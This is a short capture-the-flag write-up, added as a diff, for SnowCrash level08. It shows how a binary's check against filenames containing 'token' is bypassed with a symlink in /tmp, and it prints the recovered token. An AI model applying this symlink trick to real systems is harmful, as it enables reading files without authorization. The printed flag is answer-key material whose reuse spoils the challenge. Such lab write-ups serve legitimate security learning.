@@ -1,0 +1,21 @@
+# We have a binary file that take a file path as argument then display
+	the content of it
+
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+
+# It doesn't work with token, let's try to see why
+
+======================================================================
+
+# When reversing it, we see this line:
+	if (strstr(argv[1], "token") =! 0)
+		exit
+
+# We must have a filename not equal to token, easy with symlinks :)
+
+level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/zob -f
+level08@SnowCrash:~$ cat /tmp/zob
+cat: /tmp/zob: Permission denied
+level08@SnowCrash:~$ ./level08 /tmp/zob
+quif5eloekouj29ke0vouxean
